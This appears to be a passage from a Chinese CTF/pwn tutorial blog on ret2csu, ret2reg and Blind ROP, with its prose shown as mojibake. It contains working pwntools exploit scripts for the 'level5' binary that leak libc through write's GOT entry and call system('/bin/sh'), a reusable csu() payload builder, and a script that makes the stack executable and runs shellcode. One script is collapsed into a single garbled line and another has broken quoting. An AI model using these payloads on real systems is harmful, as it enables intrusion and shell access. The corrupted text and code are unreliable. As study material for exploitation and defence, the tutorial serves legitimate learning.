class="line">.text:<span class="number">0000000000400624</span>                 retn</span><br><span class="line">.text:<span class="number">0000000000400624</span> ; &#125; <span class="comment">// starts at 4005C0</span></span><br><span class="line">.text:<span class="number">0000000000400624</span> __libc_csu_init endp</span><br></pre></td></tr></table></figure></li><li>ä»0x0000000000400600åˆ°0x0000000000400609ï¼Œæˆ‘ä»¬å¯ä»¥å°†r13èµ‹ç»™rdx,å°†r14èµ‹ç»™rsiï¼Œå°†r15dèµ‹ç»™ediï¼ˆéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè™½ç„¶è¿™é‡Œèµ‹ç»™çš„æ˜¯ediï¼Œ<strong>ä½†å…¶å®æ­¤æ—¶rdiçš„é«˜32ä½å¯„å­˜å™¨å€¼ä¸º0</strong>ï¼Œ<strong>æ‰€ä»¥å…¶å®æˆ‘ä»¬å¯ä»¥æ§åˆ¶rdiå¯„å­˜å™¨çš„å€¼ï¼Œåªä¸è¿‡åªèƒ½æ§åˆ¶ä½32ä½ï¼‰ï¼Œè€Œè¿™ä¸‰ä¸ªå¯„å­˜å™¨ï¼Œä¹Ÿæ˜¯x64å‡½æ•°è°ƒç”¨ä¸­ä¼ é€’çš„å‰ä¸‰ä¸ªå¯„å­˜å™¨ã€‚æ­¤å¤–ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥åˆç†åœ°æ§åˆ¶r12ä¸rbxï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è°ƒç”¨æˆ‘ä»¬æƒ³è¦è°ƒç”¨çš„å‡½æ•°</strong>ã€‚<em>æ¯”å¦‚è¯´æˆ‘ä»¬å¯ä»¥æ§åˆ¶rbxä¸º0ï¼Œr12ä¸ºå­˜å‚¨æˆ‘ä»¬æƒ³è¦è°ƒç”¨çš„å‡½æ•°çš„åœ°å€</em>ã€‚<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0000000000400600</span> loc_400600:                             ; CODE XREF: __libc_csu_init+<span class="number">54</span>â†“j</span><br><span class="line">.text:<span class="number">0000000000400600</span>                 mov     rdx, r13</span><br><span class="line">.text:<span class="number">0000000000400603</span>                 mov     rsi, r14</span><br><span class="line">.text:<span class="number">0000000000400606</span>                 mov     edi, r15d</span><br><span class="line">.text:<span class="number">0000000000400609</span>                 call    qword ptr [r12+rbx*<span class="number">8</span>]</span><br></pre></td></tr></table></figure></li><li>ä»0x000000000040060Dåˆ°0x0000000000400614ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶rbxä¸rbpçš„ä¹‹é—´çš„å…³ç³»ä¸ºrbx+1=rbpï¼Œè¿™æ ·æˆ‘ä»¬å°±ä¸ä¼šæ‰§è¡Œloc_400600ï¼Œè¿›è€Œå¯ä»¥ç»§ç»­æ‰§è¡Œä¸‹é¢çš„æ±‡ç¼–ç¨‹åºã€‚è¿™é‡Œæˆ‘ä»¬å¯ä»¥ç®€å•çš„è®¾ç½®rbx=0ï¼Œrbp=1ã€‚<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">000000000040060</span>D                 add     rbx, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000400611</span>                 cmp     rbx, rbp</span><br><span class="line">.text:<span class="number">0000000000400614</span>                 jnz     <span class="type">short</span> loc_400600</span><br></pre></td></tr></table></figure></li></ol><h3 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h3><p><a href="https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/stackoverflow/ret2__libc_csu_init/hitcon-level5/level5">ctf-challenges/pwn/stackoverflow/ret2__libc_csu_init/hitcon-level5/level5 at master Â· ctf-wiki/ctf-challenges</a><br><img src="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250128110231.png" alt="Pasted image 20250128110231"></p><p><img src="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250128111234.png" alt="Pasted image 20250128111234"></p><p><img src="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250128111505.png" alt="Pasted image 20250128111505"></p><p><img src="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250128111308.png" alt="Pasted image 20250128111308"><br>idaçœ‹/cyclicæµ‹å‡ºæ ˆåç§»ä¸º<code>0x88=136</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./level5&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;level5&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_addr = <span class="number">0x40061a</span></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">mov_addr = <span class="number">0x400600</span></span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Hello, World\n&#x27;</span>)</span><br><span class="line">playload = <span class="string">&#x27;A&#x27;</span>*<span class="number">136</span> + p64(pop_addr) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(write_got) + p64(<span class="number">8</span>) + p64(write_got) + p64(<span class="number">1</span>) + p64(mov_addr) + <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x8</span>+<span class="number">8</span>*<span class="number">6</span>) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(playload)</span><br><span class="line"></span><br><span class="line">write_start = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(write_start)</span><br></pre></td></tr></table></figure><blockquote><p>payloadè§£é‡Šï¼š<br>é¦–å…ˆè¾“å…¥136ä¸ªå­—ç¬¦ä½¿ç¨‹åºå‘ç”Ÿæ ˆæº¢å‡ºï¼Œç„¶åè®©pop_addrè¦†ç›–æ ˆä¸­çš„è¿”å›åœ°å€ï¼Œä½¿ç¨‹åºæ‰§è¡Œpop_addråœ°å€å¤„çš„å‡½æ•°ï¼Œå¹¶åˆ†åˆ«å°†æ ˆä¸­çš„0ã€1ã€write_gotå‡½æ•°åœ°å€ã€8ã€write_gotã€1åˆ†åˆ«popåˆ°å¯„å­˜å™¨rbxã€rbpã€r12ã€r13ã€r14ã€r15ä¸­å»ï¼Œä¹‹åå°†popå‡½æ•°çš„è¿”å›åœ°å€è¦†ç›–mov_addrçš„åœ°å€ä¸ºï¼Œå¦‚ä¸‹ï¼š<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">000000000040061</span>A                 pop     rbx <span class="comment">//rbx-&gt; 0</span></span><br><span class="line">.text:<span class="number">000000000040061B</span>                 pop     rbp <span class="comment">//rbp-&gt; 1</span></span><br><span class="line">.text:<span class="number">000000000040061</span>C                 pop     r12 <span class="comment">//r12-&gt; write_gotå‡½æ•°åœ°å€</span></span><br><span class="line">.text:<span class="number">000000000040061</span>E                 pop     r13 <span class="comment">//r13-&gt; 8</span></span><br><span class="line">.text:<span class="number">0000000000400620</span>                 pop     r14 <span class="comment">//r14-&gt; write_gotå‡½æ•°åœ°å€</span></span><br><span class="line">.text:<span class="number">0000000000400622</span>                 pop     r15 <span class="comment">//r15-&gt; 1</span></span><br><span class="line">.text:<span class="number">0000000000400624</span>                 retn        <span class="comment">//è¦†ç›–ä¸ºmov_addr</span></span><br></pre></td></tr></table></figure><br>ä¸¤ä¸ªwrite_gotå‡½æ•°ä½œç”¨:<br>å†å¸ƒç½®å®Œå¯„å­˜å™¨åï¼Œç”±äºæœ‰<code>call qword ptr[r12+rbx*8]</code>å®ƒè°ƒç”¨äº†writeå‡½æ•°ï¼Œå…¶å‚æ•°ä¸º<code>write_got</code>å‡½æ•°åœ°å€ï¼Œå†™æˆCè¯­è¨€ç±»ä¼¼äºï¼š<code>write(write_gotå‡½æ•°åœ°å€)==printfï¼ˆwrite_gotå‡½æ•°åœ°å€)</code>ï¼Œå†ä½¿ç”¨<code>u64(p.recv(8)</code>æ¥å—æ•°æ®å¹¶printå‡ºæ¥å°±è¡Œäº†<br>ä¹‹åç¨‹åºè½¬å‘mov_addrå‡½æ•°ï¼Œåˆ©ç”¨movæŒ‡ä»¤å¸ƒç½®å¯„å­˜å™¨rdxï¼Œrsiï¼Œedi<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0000000000400600</span>                 mov     rdx, r13 <span class="comment">//rdx=r13==8</span></span><br><span class="line">.text:<span class="number">0000000000400603</span>                 mov     rsi, r14 <span class="comment">//rsi==r14==write_gotå‡½æ•°åœ°å€</span></span><br><span class="line">.text:<span class="number">0000000000400606</span>                 mov     edi, r15d</span><br><span class="line"><span class="comment">//edi==r15d==1</span></span><br><span class="line">.text:<span class="number">0000000000400609</span>                 call    qword ptr [r12+rbx*<span class="number">8</span>] <span class="comment">//call write_gotå‡½æ•°åœ°å€</span></span><br><span class="line">.text:<span class="number">000000000040060</span>D                 add     rbx, <span class="number">1</span> </span><br><span class="line">.text:<span class="number">0000000000400611</span>                 cmp     rbx, rbp <span class="comment">//rbx==1,rbp==1</span></span><br><span class="line">.text:<span class="number">0000000000400614</span>                 jnz     <span class="type">short</span> loc_400600</span><br></pre></td></tr></table></figure><br>JNZ(æˆ–JNE)(jump if not zero, or not equal)ï¼Œæ±‡ç¼–è¯­è¨€ä¸­çš„æ¡ä»¶è½¬ç§»æŒ‡ä»¤ã€‚ç»“æœä¸ä¸ºé›¶(æˆ–ä¸ç›¸ç­‰)åˆ™è½¬ç§»</p></blockquote><p>è¿™é‡Œrbxå’Œrbpéƒ½ç­‰äº1ï¼Œä»–ä»¬ç›¸ç­‰ï¼Œæ‰€ä»¥ç»§ç»­æ‰§è¡Œpayloadä»£ç (main_addr)ï¼Œè€Œä¸æ˜¯å»æ‰§è¡Œloc_400600</p><blockquote><p>ä»æ•´ä½“ä¸Šæ¥çœ‹ï¼Œæˆ‘ä»¬è¾“å…¥äº†<code>&#39;A&#39;*136</code>ï¼Œåˆ©ç”¨payloadå¯¹å¯„å­˜å™¨å¸ƒå±€ä¹‹ååˆé‡æ–°å›åˆ°äº†mainå‡½æ•°ï¼Œå†è¯´è¯´<code>&#39;a&#39;*(0x8+8*6)</code>çš„ä½œç”¨ï¼šå®ƒçš„ä½œç”¨å°±æ˜¯ä¸ºäº†<strong>å¹³è¡¡å †æ ˆ</strong><br>ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“mov_addræ‰§è¡Œå®Œä¹‹åï¼ŒæŒ‰ç…§æµç¨‹ä»ç„¶ä¼šæ‰§è¡Œåœ°å€400616å¤„çš„å‡½æ•°ï¼Œæˆ‘ä»¬å¹¶ä¸å¸Œæœ›å®ƒæ‰§è¡Œåˆ°è¿™ä¸ªå‡½æ•°ï¼ˆå› ä¸ºä»–ä¼šå†æ¬¡popå¯„å­˜å™¨æ›´æ¢æˆ‘ä»¬å¸ƒç½®å¥½çš„å†…å®¹ï¼‰ï¼Œæ‰€ä»¥ä¸ºäº†å †æ ˆå¹³è¡¡ï¼Œæˆ‘ä»¬ä½¿ç”¨åƒåœ¾æ•°æ®å¡«å……æ­¤å¤„çš„ä»£ç ï¼ˆ<strong>æ ˆåŒºå’Œä»£ç åŒºåŒå±äºå†…å­˜åŒºåŸŸï¼Œå¯ä»¥è¢«å¡«å……</strong>ï¼‰ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š<br><img src="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250128132334.png" alt="Pasted image 20250128132334"><br>ç”¨åƒåœ¾æ•°æ®å¡«å……åœ°å€0x16-0x22çš„å†…å®¹ï¼Œæœ€åå°†main_addrè¦†ç›–retï¼Œä»è€Œæ‰§è¡Œmain_addrå¤„çš„å†…å®¹</p></blockquote><p>ç”±æ­¤æˆ‘ä»¬è·å¾—äº†writeçš„çœŸå®åœ°å€</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc=ELF(<span class="string">&#x27;/usr/lib/x86_64-linux-gnu/libc.so.6)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">libc_base=write_start-libc.symbols[&#x27;</span>write<span class="string">&#x27;]</span></span><br><span class="line"><span class="string">system_addr=libc.symbols[&#x27;</span>system<span class="string">&#x27;]+libc_base</span></span><br><span class="line"><span class="string">binsh=next(libc.search(&#x27;</span>/<span class="built_in">bin</span>/sh<span class="string">&#x27;))+libc_base</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">pop_rdi_ret=0x400623</span></span><br><span class="line"><span class="string">payload=&#x27;</span>a<span class="string">&#x27;*0x88+p64(pop_rdi_ret)+p64(binsh)+p64(system_addr)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">p.send(payload)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">p.interactive()</span></span><br></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬è·å¾—writeå‡½æ•°çš„çœŸå®åœ°å€ä¹‹åï¼Œå°±å¯ä»¥è®¡ç®—å‡ºlibcæ–‡ä»¶çš„åŸºå€ï¼Œä»è€Œå¯ä»¥è®¡ç®—å‡ºsystemå‡½æ•°<br>å’Œ/bin/shå­—ç¬¦ä¸²åœ¨å†…å­˜ä¸­çš„åœ°å€ï¼Œä»è€Œåˆ©ç”¨å®ƒã€‚<br>æ¥ä¸‹æ¥è§£é‡Šä¸€ä¸‹ç¬¬äºŒä¸ªpayloadçš„æ„æ€ï¼š<br><code>payload=&#39;a&#39;*0x88+p64(pop_rdi_ret)+p64(binsh)+p64(system_addr)</code><br>å½“ç¨‹åºé‡æ–°æ‰§è¡Œåˆ°mainå‡½æ•°æ—¶ï¼Œæˆ‘ä»¬åˆ©ç”¨æ ˆæº¢å‡ºè®©è¿”å›åœ°å€è¢«pop_rdi_retè¦†ç›–ï¼Œä»è€Œç¨‹åºæ‰§è¡Œpop_rdi_retã€‚</p><blockquote><p>æ³¨æ„ï¼Œå½“æˆ‘ä»¬send payloadä¹‹åï¼Œpop_rdi_retã€binshå’Œsystem_addrè¢«é€åˆ°äº†æ ˆä¸­ï¼Œåˆ©ç”¨gadgets:pop rdi;retå°†æ ˆä¸­çš„binshåœ°å€é€å¾€rdiå¯„å­˜å™¨ä¸­ï¼ˆä¹Ÿå°±æ˜¯è¯´pop_rdi_retçš„å‚æ•°æ˜¯åœ°å€binsh)ï¼Œç„¶åå°†systemå‡½æ•°åœ°å€è¦†ç›–åˆ°retï¼Œç¨‹åºå°±ä¼šæ‰§è¡Œæ­¤systemå‡½æ•°ã€‚<br><strong>å½“systemå‡½æ•°æ‰§è¡Œçš„æ—¶å€™ä¼šåˆ©ç”¨åˆ°rdié‡Œçš„å‚æ•°</strong></p></blockquote><h3 id="é€šç”¨"><a href="#é€šç”¨" class="headerlink" title="é€šç”¨"></a>é€šç”¨</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rbx, rbp, r12, r13, r14, r15, last</span>):</span><br><span class="line">    <span class="comment"># pop rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">    <span class="comment"># rbx should be 0,</span></span><br><span class="line">    <span class="comment"># rbp should be 1,enable not to jump</span></span><br><span class="line">    <span class="comment"># r12 should be the function we want to call</span></span><br><span class="line">    <span class="comment"># rdi=edi=r15d</span></span><br><span class="line">    <span class="comment"># rsi=r14</span></span><br><span class="line">    <span class="comment"># rdx=r13</span></span><br><span class="line">    <span class="comment"># fakeebp=&#x27;b&#x27; * 8</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x80</span> + fakeebp</span><br><span class="line">    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">0x38</span></span><br><span class="line">    payload += p64(last)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Hello, World\n&#x27;</span>)</span><br><span class="line"><span class="comment">## RDI, RSI, RDX, RCX, R8, R9, more on the stack</span></span><br><span class="line"><span class="comment">## write(1,write_got,8)</span></span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, write_got, <span class="number">8</span>, write_got, <span class="number">1</span>, main_addr)</span><br><span class="line"></span><br><span class="line">write_addr = u64(sh.recv(<span class="number">8</span>))</span><br></pre></td></tr></table></figure><h3 id="æ‚è®°"><a href="#æ‚è®°" class="headerlink" title="æ‚è®°"></a>æ‚è®°</h3><p><code>pop_rdi_ret=0x400623</code><br><em>è¿™ä¸ªæ˜¯æ€ä¹ˆæ¥çš„ï¼Ÿidaé‡Œä¸ºä»€ä¹ˆæ²¡æœ‰ï¼Ÿ</em><br><img src="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250128140952.png" alt="Pasted image 20250128140952"></p><h4 id="1-ROPgadget"><a href="#1-ROPgadget" class="headerlink" title="1.ROPgadget"></a>1.ROPgadget</h4><p><img src="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250128140914.png" alt="Pasted image 20250128140914"></p><h4 id="2-çœ‹æœºå™¨ç "><a href="#2-çœ‹æœºå™¨ç " class="headerlink" title="2.çœ‹æœºå™¨ç "></a>2.çœ‹æœºå™¨ç </h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pop rbx---------&gt;<span class="number">5B</span></span><br><span class="line">pop rbp---------&gt;<span class="number">5</span>D</span><br><span class="line">pop r12----------&gt;<span class="number">41</span> <span class="number">5</span>C</span><br><span class="line">pop r13----------&gt;<span class="number">41</span> <span class="number">5</span>D</span><br><span class="line">pop r14----------&gt;<span class="number">41</span> <span class="number">5</span>E</span><br><span class="line">pop r15----------&gt;<span class="number">41</span> <span class="number">5F</span></span><br></pre></td></tr></table></figure><p>xxxxxxxxxx28 1from pwn import <em>2context(os=â€™linuxâ€™, arch=â€™amd64â€™, log_level=â€™debugâ€™)3â€‹4io = process(â€˜./pwn2â€™)5elf = ELF(â€˜./pwn2â€™)6â€‹7vul = 0x4009E78write = 0x4009DD9â€‹10pop_rdi = 0x4014c611pop_rsi = 0x4015e712pop_rdx = 0x44262613jmp_rsi = 0x4a331314mov_rdi_esi = 0x47a3b315â€‹16payload  = â€œAâ€</em>0x8817payload += p64(pop_rsi) + p64(7) + p64(pop_rdi) + p64(elf.sym[â€˜<strong>stack_protâ€™]) + p64(mov_rdi_esi)18payload += p64(pop_rdi) + p64(elf.sym[â€˜</strong>libc_stack_endâ€™]) + p64(elf.sym[â€˜_dl_make_stack_executableâ€™])19payload += p64(vul)20â€‹21io.sendlineafter(â€˜welcome~\nâ€™, payload)22â€‹23shellcode = asm(shellcraft.sh())24payload = shellcode.ljust(0x88, â€œAâ€) + p64(jmp_rsi)25â€‹26io.sendline(payload)27â€‹28io.interactive()python</p><h2 id="ret2reg"><a href="#ret2reg" class="headerlink" title="ret2reg"></a>ret2reg</h2><p>ret2regï¼Œå³è¿”å›åˆ°å¯„å­˜å™¨åœ°å€è¿›è¡Œæ”»å‡»ï¼Œå¯ä»¥ç»•è¿‡åœ°å€æ··æ·†ï¼ˆASLRï¼‰ã€‚<br>ä¸€èˆ¬ç”¨äºå¼€å¯ASLRçš„ret2shellcodeé¢˜å‹ï¼Œåœ¨å‡½æ•°æ‰§è¡Œåï¼Œä¼ å…¥çš„å‚æ•°åœ¨æ ˆä¸­ä¼ ç»™æŸå¯„å­˜å™¨ï¼Œç„¶è€Œè¯¥å‡½æ•°åœ¨ç»“æŸå‰å¹¶æœªå°†è¯¥å¯„å­˜å™¨å¤ä½ï¼Œå°±å¯¼è‡´è¿™ä¸ªå¯„å­˜å™¨ä»è¿˜ä¿å­˜ç€å‚æ•°ï¼Œå½“è¿™ä¸ªå‚æ•°æ˜¯shellcodeæ—¶ï¼Œåªè¦ç¨‹åºä¸­å­˜åœ¨jmp/call regä»£ç ç‰‡æ®µæ—¶ï¼Œå³å¯é€šè¿‡gadgetè·³è½¬è‡³è¯¥å¯„å­˜å™¨æ‰§è¡Œshellcodeã€‚<br>è¯¥æ”»å‡»æ–¹æ³•ä¹‹æ‰€ä»¥èƒ½æˆåŠŸï¼Œæ˜¯å› ä¸ºå‡½æ•°å†…éƒ¨å®ç°æ—¶ï¼Œæº¢å‡ºçš„ç¼“å†²åŒºåœ°å€é€šå¸¸ä¼šåŠ è½½åˆ°æŸä¸ªå¯„å­˜å™¨ä¸Šï¼Œåœ¨åæ¥çš„è¿è¡Œè¿‡ç¨‹ä¸­ä¸ä¼šä¿®æ”¹ã€‚</p><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><ul><li>æŸ¥çœ‹æ ˆæº¢å‡ºè¿”å›æ—¶å“ªä¸ªå¯„å­˜å™¨æŒ‡å‘ç¼“å†²åŒºç©ºé—´ã€‚</li><li>æŸ¥æ‰¾å¯¹åº”çš„call å¯„å­˜å™¨æˆ–è€…jmp å¯„å­˜å™¨æŒ‡ä»¤ï¼Œå°†EIPè®¾ç½®ä¸ºè¯¥æŒ‡ä»¤åœ°å€ã€‚</li><li>å°†å¯„å­˜å™¨æ‰€æŒ‡å‘çš„ç©ºé—´ä¸Šæ³¨å…¥shellcodeï¼ˆç¡®ä¿è¯¥ç©ºé—´æ˜¯å¯ä»¥æ‰§è¡Œçš„ï¼Œé€šå¸¸æ˜¯æ ˆä¸Šçš„ï¼‰<h3 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h3></li><li>åˆ†æå’Œè°ƒè¯•æ±‡ç¼–ï¼ŒæŸ¥çœ‹æº¢å‡ºå‡½æ•°è¿”å›æ—¶å“ªä¸ªå¯„å­˜å™¨æŒ‡å‘ç¼“å†²åŒºåœ°å€</li><li>å‘å¯„å­˜å™¨æŒ‡å‘çš„ç¼“å†²åŒºä¸­æ³¨å…¥shellcode</li><li>æŸ¥æ‰¾call è¯¥å¯„å­˜å™¨æˆ–è€…jmp è¯¥å¯„å­˜å™¨æŒ‡ä»¤ï¼Œå¹¶å°†è¯¥æŒ‡ä»¤åœ°å€è¦†ç›–ret<h3 id="é˜²å¾¡æ–¹æ³•"><a href="#é˜²å¾¡æ–¹æ³•" class="headerlink" title="é˜²å¾¡æ–¹æ³•"></a>é˜²å¾¡æ–¹æ³•</h3>åœ¨å‡½æ•°retä¹‹å‰ï¼Œå°†æ‰€æœ‰èµ‹è¿‡å€¼çš„å¯„å­˜å™¨å…¨éƒ¨å¤ä½ï¼Œæ¸…0ï¼Œä»¥é¿å…æ­¤ç±»æ¼æ´</li></ul><h2 id="brop"><a href="#brop" class="headerlink" title="brop"></a>brop</h2><h3 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h3><p><strong>BROPå…¨ç§°ä¸ºâ€BlindROPâ€</strong>ï¼Œä¸€èˆ¬åœ¨æˆ‘ä»¬æ— æ³•è·å¾—äºŒè¿›åˆ¶æ–‡ä»¶çš„æƒ…å†µä¸‹åˆ©ç”¨ ROPè¿›è¡Œè¿œç¨‹æ”»å‡»æŸä¸ªåº”ç”¨ç¨‹åºï¼ŒåŠ«æŒè¯¥åº”ç”¨ç¨‹åºçš„æ§åˆ¶æµï¼Œ<strong>æˆ‘ä»¬å¯ä»¥ä¸éœ€è¦çŸ¥é“è¯¥åº”ç”¨ç¨‹åºçš„æºä»£ç æˆ–è€…ä»»ä½•äºŒè¿›åˆ¶ä»£ç </strong>ï¼Œè¯¥åº”ç”¨ç¨‹åºå¯ä»¥è¢«ç°æœ‰çš„ä¸€äº›ä¿æŠ¤æœºåˆ¶ï¼Œè¯¸å¦‚NX, ASLR, PIE, ä»¥åŠstack canariesç­‰ä¿æŠ¤ï¼Œåº”ç”¨ç¨‹åºæ‰€åœ¨çš„æœåŠ¡å™¨å¯ä»¥æ˜¯32ä½ç³»ç»Ÿæˆ–è€…64ä½ç³»ç»Ÿï¼ŒBROPè¿™ä¸€æ¦‚å¿µåœ¨2014å¹´ç”±Standfordçš„Andrea Bittauå‘è¡¨åœ¨Oakland 2014çš„è®ºæ–‡Hacking Blindä¸­æå‡ºã€‚</p><blockquote><p>è®ºæ–‡åœ°å€:<a href="https://www.scs.stanford.edu/brop/bittau-brop.pdf">bittau-brop.pdf</a></p></blockquote><h3 id="æ”»å‡»æ¡ä»¶"><a href="#æ”»å‡»æ¡ä»¶" class="headerlink" title="æ”»å‡»æ¡ä»¶"></a>æ”»å‡»æ¡ä»¶</h3><ol><li>ç¨‹åºå¿…é¡»å­˜åœ¨ä¸€ä¸ªå·²çŸ¥çš„æ ˆæº¢å‡ºæ¼æ´ï¼Œå¹¶ä¸”æ”»å‡»è€…çŸ¥é“å¦‚ä½•è§¦å‘è¯¥æ¼æ´ï¼›</li><li>åº”ç”¨ç¨‹åºåœ¨crashä¹‹åå¯ä»¥é‡æ–°å¯åŠ¨ï¼ˆå¤æ´»ï¼‰ï¼Œå¹¶ä¸”é‡æ–°å¯åŠ¨ï¼ˆå¤æ´»ï¼‰çš„è¿›ç¨‹ä¸ä¼šè¢«re-rand(è™½ç„¶æœ‰ASLRçš„ä¿æŠ¤ï¼Œä½†æ˜¯å¤æ´»çš„è¿›ç¨‹å’Œä¹‹å‰çš„è¿›ç¨‹çš„åœ°å€éšæœºåŒ–æ˜¯ä¸€æ ·çš„)ï¼Œè¿™ä¸ªéœ€æ±‚å…¶å®åœ¨ç°å®ä¸­æ˜¯å­˜åœ¨ä¸”åˆç†çš„ï¼Œè¯¸å¦‚åƒå¦‚ä»Šçš„nginx, MySQL, Apache, OpenSSH, Sambaç­‰åº”ç”¨å‡ç¬¦åˆæ­¤ç±»ç‰¹æ€§ã€‚</li></ol><h3 id="æ”»å‡»æ€è·¯"><a href="#æ”»å‡»æ€è·¯" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h3><ol><li>æš´åŠ›æšä¸¾ï¼Œè·å–æ ˆæº¢å‡ºé•¿åº¦ï¼Œå¦‚æœç¨‹åºå¼€å¯äº†Canary ï¼Œé¡ºä¾¿å°†canaryä¹Ÿå¯ä»¥çˆ†å‡ºæ¥</li><li>å¯»æ‰¾å¯ä»¥<strong>è¿”å›åˆ°ç¨‹åºmainå‡½æ•°çš„gadget</strong>,é€šå¸¸è¢«ç§°ä¸ºstop_gadget</li><li>åˆ©ç”¨stop_gadgetå¯»æ‰¾å¯åˆ©ç”¨(potentially useful)gadgetsï¼Œå¦‚:pop rdi; ret</li><li>å¯»æ‰¾BROP Gadgetï¼Œå¯èƒ½éœ€è¦è¯¸å¦‚writeã€putç­‰å‡½æ•°çš„ç³»ç»Ÿè°ƒç”¨</li><li>å¯»æ‰¾ç›¸åº”çš„PLTåœ°å€</li><li>dumpè¿œç¨‹å†…å­˜ç©ºé—´<br>æ‹¿åˆ°ç›¸åº”çš„GOTå†…å®¹åï¼Œæ³„éœ²å‡ºlibcçš„å†…å­˜ä¿¡æ¯ï¼Œæœ€ååˆ©ç”¨ropå®Œæˆgetshell</li></ol><blockquote><p><strong>çŸ¥è¯†ç‚¹1-stop_gadget</strong>ï¼šä¸€èˆ¬æƒ…å†µä¸‹ï¼Œå¦‚æœæˆ‘ä»¬æŠŠæ ˆä¸Šçš„return addressè¦†ç›–æˆæŸäº›æˆ‘ä»¬éšæ„é€‰å–çš„å†…å­˜åœ°å€çš„è¯ï¼Œç¨‹åºæœ‰å¾ˆå¤§å¯èƒ½æ€§ä¼šæŒ‚æ‰ï¼ˆæ¯”å¦‚ï¼Œè¯¥return addressæŒ‡å‘äº†ä¸€æ®µä»£ç åŒºåŸŸï¼Œé‡Œé¢ä¼šæœ‰ä¸€äº›å¯¹ç©ºæŒ‡é’ˆçš„è®¿é—®é€ æˆç¨‹åºcrashï¼Œä»è€Œä½¿å¾—æ”»å‡»è€…çš„è¿æ¥ï¼ˆconnectionï¼‰è¢«å…³é—­ï¼‰ã€‚ä½†æ˜¯ï¼Œ<em>å­˜åœ¨å¦å¤–ä¸€ç§æƒ…å†µï¼Œå³è¯¥return addressæŒ‡å‘äº†ä¸€å—ä»£ç åŒºåŸŸï¼Œå½“ç¨‹åºçš„æ‰§è¡Œæµè·³åˆ°é‚£æ®µåŒºåŸŸä¹‹åï¼Œç¨‹åºå¹¶ä¸ä¼šcrashï¼Œè€Œæ˜¯è¿›å…¥äº†æ— é™å¾ªç¯ï¼Œè¿™æ—¶ç¨‹åºä»…ä»…æ˜¯hangåœ¨äº†é‚£é‡Œï¼Œæ”»å‡»è€…èƒ½å¤Ÿä¸€ç›´ä¿æŒè¿æ¥çŠ¶æ€</em>ã€‚äºæ˜¯ï¼Œæˆ‘ä»¬æŠŠè¿™ç§ç±»å‹çš„gadgetï¼Œæˆä¸º<strong><em>stop 